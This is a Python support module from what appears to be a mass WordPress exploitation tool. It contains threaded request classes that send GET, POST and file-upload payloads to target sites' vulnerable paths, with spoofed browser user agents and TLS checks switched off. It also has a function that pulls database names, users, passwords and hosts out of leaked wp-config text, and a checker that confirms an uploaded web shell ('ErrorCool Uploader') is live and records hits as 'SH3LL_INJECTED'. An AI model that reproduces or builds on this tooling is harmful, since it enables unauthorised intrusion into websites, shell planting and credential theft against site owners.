import threading
import re, os, time, sys
import requests
import urllib3
import importlib 
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

Main_Worker = importlib.import_module('main')

#from urllib3.exceptions import InsecureRequestWarning
import mimetypes
import time, os, random 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


import random

DeviceAgent_mapper = {
    "pc_chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "pc_firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "pc_edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "pc_safari": "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "phone_chrome": "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "phone_safari": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "phone_firefox": "Mozilla/5.0 (Android 13; Mobile; rv:124.0) Gecko/124.0 Firefox/124.0",
    # "samsung_browser": "Mozilla/5.0 (Linux; Android 13; SAMSUNG SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/123.0.0.0 Mobile Safari/537.36",
    # "opera": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/97.0.0.0"
}

# random user-agent
# random_ua = random.choice(user_agents)
# print(f"Random User-Agent:\n{random_ua}")
#headers = {'User-Agent': random_ua}


NO_USED = None
#Color Code
RESET = "\033[0m"
BOLD = "\033[1m"

FG_GREEN = "\033[32m"
FG_RED = "\033[31m"
FG_YELLOW = "\033[33m"
FG_CYAN = "\033[36m"

BG_GREEN = "\033[42m"
BG_RED = "\033[41m"
BG_YELLOW = "\033[43m"
BG_CYAN = "\033[46m"

SBF = f'\033[33m['  # Yellow [
SBE = f']\033[0m'   # ] Reset

class Printed_Value:
    
    def fire_effect(text: str): 
        return f"\033[1m\033[34m{text}\033[0m"  # Bright Blue Text, Reset

        
    def get_time(): 
        return Printed_Value.fire_effect(time.strftime("%D-%H:%M:%S", time.localtime())) 

  
    def _format_message(domain: str, symbol: str, symbol_color: str, message_bg_color: str, message: str): 
        timer_str = Printed_Value.get_time() 
        return (f"[{timer_str}] {symbol_color}[{symbol}]{RESET}{BOLD} {domain} {FG_CYAN}=>{RESET} {message_bg_color}{BOLD}{message}{RESET}")

    def Log_Success(domain: str, message: str): 
        print(Printed_Value._format_message(domain, "+", FG_GREEN, BG_GREEN, message)) 
    
    def Log_Fail(domain: str, message: str): 
        print(Printed_Value._format_message(domain, "-", FG_RED, BG_RED, message)) 
    
    def Log_Error(text: str, msg_error: str): 
        print(Printed_Value._format_message(text, "!", FG_YELLOW, BG_RED, msg_error)) 
    
    def Log_Info(domain: str, message: str): 
        print(Printed_Value._format_message(domain, "?", FG_YELLOW, BG_YELLOW, message)) 
    
    def Found_CMS(domain: str, message: str): 
        print(Printed_Value._format_message(domain, "*", FG_CYAN, BG_CYAN, message)) 
    
    def ReportLog_Error(info: str, error: str): 
        timer_str = Printed_Value.get_time() 
        print(f"[{timer_str}]{SBF}{FG_YELLOW}?{SBE}{RESET}{BOLD} {info} {BOLD}{FG_CYAN}=>{RESET} {BOLD}{BG_RED}{error}{RESET}")


def SAVEAS_LOG(filename, reportime, domain, value_err):
    with open(f'Logs/{filename}.txt', 'a', encoding='utf-8') as f: 
        f.write(f"[T]{reportime} ~ {domain} : {value_err}\n")
"""

Valid Shell before start geneate payload

import requests 
headers = {'User-Agent': 'python'}
def HOSTShell_valid(host_shell):
    #function must check valid link shell (host) before generate sent to exploit
    valid_link = requests.get(host_shell, headers=headers, timeout=10).text
    if valid_link: 
        if 'WP_Burn was HERE' in str(valid_link):
            return True
        return False
    return False
"""




class Threaded_GET:
    def __init__(self, 
                 CFG_DOMAIN, 
                 CFG_VULN=NO_USED, 
                 CFG_TIMEOUT=NO_USED, 
                 CFG_USERAGENT=NO_USED,
                 CFG_POSTDATA=NO_USED,
                 CFG_DELAY_ATTACK=NO_USED, 
                 SET_REDIRECT=NO_USED,
                 SET_MODE=NO_USED,
                 CFG_PROXIES=NO_USED,
                 Mem_Sess=NO_USED
                 ):
        self.TAR_URL = CFG_DOMAIN
        self.vuln_path = CFG_VULN if CFG_VULN else ''.strip()
        self.timeout = CFG_TIMEOUT if CFG_TIMEOUT else 5 #default if set NO_USED
        self.delay_attack = CFG_DELAY_ATTACK if CFG_DELAY_ATTACK else 0
        self.useragent = CFG_USERAGENT if CFG_USERAGENT else None #Default Mozilla/5.0 
        if 'User-Agent' in self.useragent:
            self.headers = self.useragent
        else:
            self.headers = {'User-Agent': self.useragent} if self.useragent else None
        
        self.Post_DATA = CFG_POSTDATA if CFG_POSTDATA else ''.strip()
        self.mode = SET_MODE 
        #self.keyword_success = keyword_success if keyword_success else []
        #self.keyword_fail = keyword_fail if keyword_fail else []
        #self.Regex_payload = Regex_payload if Regex_payload else []
        self.results = {}
      
        self.SET_Redirect = SET_REDIRECT if SET_REDIRECT else True 
        self.SET_Proxies = CFG_PROXIES if CFG_PROXIES else NO_USED 
        self.sess_ = Mem_Sess
         
    def rebuild_url(self):
        if self.vuln_path:
            return f"{self.TAR_URL}/{self.vuln_path}"
        else:
            return f"{self.TAR_URL}"
    """
    
    
    def Analyze_Resp(self, text):
        if self.keyword_success:
            for succ_kw in self.keyword_success:
                if succ_kw in text:
                    return succ_kw
        if self.keyword_fail:
            for fail_kw in self.keyword_fail:
                if fail_kw in text:
                    return fail_kw
                
        if self.Regex_payload:
            for pattern_payload in self.Regex_payload:
                Found_RES = re.findall(pattern_payload, text)
                if Found_RES:
                    return Found_RES
                
            
        return None
    """

    def Func_ReqGET(self, url):
        return requests.get(url, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)
        
          
    def Func_ReqPOSTDATA(self, url):
        return requests.get(url, data=self.Post_DATA, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)
      
    def Func_ReqSESSION(self, url):
        return self.sess_.get(url, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)  
        
    
    def _thread_worker(self):
        RES_GET = None
        url = self.rebuild_url()

        GET_MODE = {
            "req_get": self.Func_ReqGET,
            "req_postdata": self.Func_ReqPOSTDATA,
            "sess_get": self.Func_ReqSESSION,
        }

        if self.mode not in GET_MODE:
            return 
        
        
        # >>> RES_GET = None
        # >>> RES = {'resp': RES_GET}
        # >>> if not RES['resp']:
        # ...     print('nothing found')
        # ... else:
        # ...     print('found')
        # ...
        # nothing found
        
        try:
            RES_GET = GET_MODE[self.mode](url) 
            if RES_GET.status_code == 429: # The user (or bot, or script) has sent too many requests in a given amount of time
                # self.results[self.vuln_path] = { 'domain': self.TAR_URL,
                #     'error': RES_GET.status_code }
                Report_Times = Printed_Value.get_time() 
                Main_Worker.Saved_Result(r'DB_Results\Domain_DetectBot.txt', f'{Report_Times} | {RES_GET.status_code}', f'{self.TAR_URL}\n')
                
                return

            #GET = self.Func_ReqGET(url)
            #status = self.Analyze_Resp(r.text) 
            self.results[self.vuln_path] = {         
                'vuln': url,
                'domain': self.TAR_URL,
                'resp': RES_GET,
                'status': RES_GET.status_code
            }
      

        except Exception as e:
            
            #print(str(e)) = HTTPConnectionPool(host='localhostcc', port=80): Max retries exceeded with url: /wordpress6/xmlrpc.php (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x0000022CBC434FD0>: Failed to establish a new connection: [Errno 11001] getaddrinfo failed'))
            self.results[self.vuln_path] = { #self.results[self.vuln_path] is usually a dictionary (like {key: value}). key is self.results and value is self.vuln_path
                'vuln': url,
                'domain': self.TAR_URL,
                'resp': None,
                'status': 'error',
                'error': str(e)
            }
            #Printed_Value.Log_Error('[INF] Error Threaded_GET :', str(e))
        
        if self.delay_attack:
            time.sleep(self.delay_attack)

		
    def run(self):
        threads = []
        t = threading.Thread(target=self._thread_worker, args=())
        t.start()
        threads.append(t)

        for t in threads:
            t.join()

        return self.results
 
class Threaded_POST:
    def __init__(self, 
                 CFG_DOMAIN, 
                 CFG_VULN=NO_USED, 
                 CFG_TIMEOUT=NO_USED, 
                 CFG_USERAGENT=NO_USED, 
                 CFG_DATA=NO_USED, 
                 CFG_FILE_UPLOAD=NO_USED, 
                 CFG_RAW_BODY=NO_USED, 
                 CFG_DELAY_ATTACK=0, 
                 #Regex_payload=NO_USED, 
                 CFG_MODE=NO_USED, 
                 SET_REDIRECT=NO_USED,
                 CFG_Proxies=NO_USED,
                 Mem_Sess=NO_USED
                 ):
        self.TAR_URL = CFG_DOMAIN
        self.vulnlist = CFG_VULN if CFG_VULN else ''.strip()
        self.mode = CFG_MODE 
        self.timeout = CFG_TIMEOUT if CFG_TIMEOUT else 5
        self.useragent = CFG_USERAGENT if CFG_USERAGENT else None #or Default Mozilla/5.0 
        if 'User-Agent' in self.useragent:
            self.headers = self.useragent
        else:
            self.headers = {'User-Agent': self.useragent} if self.useragent else None
        self.data_payload = CFG_DATA if CFG_DATA else {}
        self.file_upload = CFG_FILE_UPLOAD if CFG_FILE_UPLOAD else {} # Dict like {'file': open(...)} or None (NO_USED)
        # self.keyword_success = keyword_success if keyword_success else []
        # self.keyword_fail = keyword_fail if keyword_fail else []
        self.results = {}
        self.delay_attack = CFG_DELAY_ATTACK if CFG_DELAY_ATTACK else 0   
    
        self.raw_body = CFG_RAW_BODY if CFG_RAW_BODY else []
        self.SET_Redirect = SET_REDIRECT if SET_REDIRECT else True #Remembers Default (When allow_redirects is not used):
        #print(self.SET_Redirect)
        self.SET_Proxies = CFG_Proxies if CFG_Proxies else NO_USED 
        
        self.sess_ = Mem_Sess

    def Prepare_Files(self):
        files = {}
        
        for key in self.file_upload:
            file_path = self.file_upload[key]
            file_obj = open(file_path, 'rb')
            filename = os.path.basename(file_path)

            # Default content-type for multipart/form-data
            content_type = mimetypes.guess_type(file_path)[0] or 'application/octet-stream'

            # Add the file to the files dictionary (as a tuple)
            files[key] = (filename, file_obj, content_type)


            #[+] Prepared file: key='file', name='hacked.txt', type='text/plain'

        return files

    #Func_Post_Form => Send regular form data (application/x-www-form-urlencoded)
    def Func_PostForm(self, url):
        return requests.post(url, headers=self.headers, data=self.data_payload, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)


    
    def Func_UploadFileParam(self, url):
        Parameter_Form = self.data_payload
        return requests.post(url, headers=self.headers, files=Parameter_Form, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)
            #                  , proxies={
            # 'http': 'http://127.0.0.1:8080', 
            # 'https': 'http://127.0.0.1:8080'  
            # }  )
    #Func_File_Upload => → Upload file(s) using helper method Prepare_Files()
    def Func_FileUpload(self, url):
        Form_UploadFiles = self.Prepare_Files()
        return requests.post(url, headers=self.headers, files=Form_UploadFiles, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)
        #proxies={
        #    'http': 'http://127.0.0.1:8080', 
        #    'https': 'http://127.0.0.1:8080'  
        #}   
        
    #Func_MultiPart Send text + files together (multipart/form-data)
    def Func_MultiPart(self, url):
        Form_UploadFiles = self.Prepare_Files()
        return requests.post(url, headers=self.headers, data=self.data_payload, files=Form_UploadFiles, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)
    
    #Func_Raw_Body => Send raw data in body (custom or binary)  Use this when you want to send raw JSON, XML, or binary (manual crafted body).
    def Func_Raw_Body(self, url):
        return requests.post(url, headers=self.headers, data=self.raw_body, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies)
    
    def Func_ReqSESSPOST(self, url):
        return self.sess_.post(url, data=self.data_payload, headers=self.headers, timeout=self.timeout, verify=False, allow_redirects=self.SET_Redirect, proxies=self.SET_Proxies) 

    def rebuild_url(self):
        if self.vulnlist:
            return f"{self.TAR_URL}/{self.vulnlist}"
        else:
            return f"{self.TAR_URL}"


    def thread_worker(self):
        url = self.rebuild_url()
    
            
        """
            Waste time with Func_Post_Form(url) we dont need this just calll function 
            response = data['resp']
            KeyError: 'resp'
        
        """
        Post_Forms = {
            "post_form": self.Func_PostForm,
            "file_upload": self.Func_FileUpload,
            "multipart": self.Func_MultiPart,
            "raw_body": self.Func_Raw_Body,

            #New Function
            "uploadfile_param": self.Func_UploadFileParam,
            "sess_post": self.Func_ReqSESSPOST,
            
        }

        try:
            if self.mode not in Post_Forms:
                return 
            
            RES_POST = Post_Forms[self.mode](url)
            if RES_POST.status_code == 429:
                # self.results[self.vuln_path] = { 'domain': self.TAR_URL,
                #     'error': RES_GET.status_code }
                Report_Times = Printed_Value.get_time()
                Main_Worker.Saved_Result(r'DB_Results\Domain_Detect_BOT.txt', f'{Report_Times} | {RES_POST.status_code}', f'{self.TAR_URL}\n')
                
                return
            
            self.results[self.vulnlist] = {
                'vuln': url,
                'domain': self.TAR_URL,
                'resp': RES_POST,  
                'status': RES_POST.status_code
            }
            
        except Exception as e:
            
            self.results[self.vulnlist] = {
                'vuln': url,
                'domain': self.TAR_URL,
                'resp': None, #prevent error message => if REZ_FILEMANAGER['resp']: KeyError: 'resp'  
                'status': 'error',
                'error': str(e)
            }
            #Printed_Value.Log_Error('[INF] Error Threaded_POST :', str(e))

        if self.delay_attack:
            time.sleep(self.delay_attack)

    def run(self):
        threads = []
        t = threading.Thread(target=self.thread_worker, args=())
        t.start()
        threads.append(t)

        for t in threads:
            t.join()

        return self.results
    




def Extract_WPNonce(text: str):
    patterns = [
        r'(?:nonce|security|wpnonce)\s*[:=]\s*[\'"]?([a-f0-9]{10})[\'"]?',
        r'wp_nonce_field\([\'"]?[\w-]+[\'"]?\s*,\s*[\'"]?([a-f0-9]{10})[\'"]?\)',
        r'<input\s+type=["\']hidden["\']\s+name=["\'](?:security|nonce)["\']\s+value=["\']([a-f0-9]{10})["\']',
        r'var\s+\w+\s*=\s*["\']([a-f0-9]{10})["\']',
        r'wp_localize_script\([^\)]*\{\s*[\'"]nonce[\'"]\s*:\s*[\'"]([a-f0-9]{10})[\'"]',
        r'[?&]nonce=([a-f0-9]{10})(?=&|$)',
        r'[?&]wpnonce=([a-f0-9]{10})(?=&|$)',
        r'"nonce"\s*:\s*"([a-f0-9]{10})"' 
    ]
    
    
    #nonce_search = r'"nonce":"([a-f0-9]+)"'
    for pattern in patterns:
        matches = re.findall(pattern, text, re.IGNORECASE)
        for nonce in matches:
            if re.fullmatch(r'[a-f0-9]{10}', nonce):
                return nonce
    
    Found_RES = re.search( r'"nonce":"([a-f0-9]{10})"', text)
     
    if Found_RES:
        return Found_RES.group(1)
           
    # Fallback: split-based raw pattern
    try:
        part = text.split('ajax_nonce":"', 1)[1][:10]
        if re.fullmatch(r'[a-f0-9]{10}', part):
            return part
        
    except IndexError:
        pass

    return None

def WordpressDB_Extract(wp_value):

    re_DB_NAME = r"'DB_NAME(.*)'"
    re_DB_USER = r"'DB_USER', '(.*)'"
    re_DB_PASSWORD = r"'DB_PASSWORD', '(.*)'"
    re_DB_HOST = r"'DB_HOST', '(.*)'"

    rez_dbname, rez_dbuser, rez_dbpasswd, rez_dbhost = re.findall(re_DB_NAME, wp_value)[0], \
        re.findall(re_DB_USER, wp_value)[0], \
            re.findall(re_DB_PASSWORD, wp_value)[0], \
                re.findall(re_DB_HOST, wp_value)[0]
    rez_dbname = str(rez_dbname).replace("'", '').replace(',', '').strip()
    rez_dbuser = str(rez_dbuser).replace("'", '').replace(',', '').strip()
    rez_dbpasswd = str(rez_dbpasswd).replace("'", '').replace(',', '').strip()
    rez_dbhost = str(rez_dbhost).replace("'", '').replace(',', '').strip()
    return rez_dbname, rez_dbuser, rez_dbpasswd, rez_dbhost
    
    


########## VALID SHELL WITH LINK BEFORE GENERATE PAYLOAD #############

def Func_ValidShell(SET_Timeout, Proxies_ON, Link_Shelled, Config_UA):
    try:

        Req_ValidShell = Threaded_GET(Link_Shelled, 
                                                NO_USED, 
                                                SET_Timeout, 
                                                Config_UA, 
                                                NO_USED, 
                                                NO_USED,
                                                NO_USED,
                                                'req_get', 
                                                Proxies_ON, 
                                                NO_USED)
        RUNNER_VALIDSHELL = Req_ValidShell.run()
        REZ_VALIDSHELL = [RUNNER_VALIDSHELL[i] for i in RUNNER_VALIDSHELL][0]
        if REZ_VALIDSHELL['resp']:
            #'WP_Burn was HERE' in str(REZ_VALIDSHELL['resp'].text) or
            if '>ErrorCool Uploader' in str(REZ_VALIDSHELL['resp'].text) or 'multipart/form-data' and 'method="POST' and 'value="Upload' in str(REZ_VALIDSHELL['resp'].text):
                Main_Worker.Saved_Result(r'DB_Results\SH3LL_INJECTED.txt', f'{Link_Shelled}\n')
                return True
            #if '>ErrorCool Uploader' in str(REZ_VALIDSHELL['resp'].text) or 'multipart/form-data' and 'method="POST' and 'value="Upload' in str(REZ_VALIDSHELL['resp'].text):
 
        return False
    except Exception as e:
        Printed_Value.Log_Error("Error Func_ValidShell :", str(e))
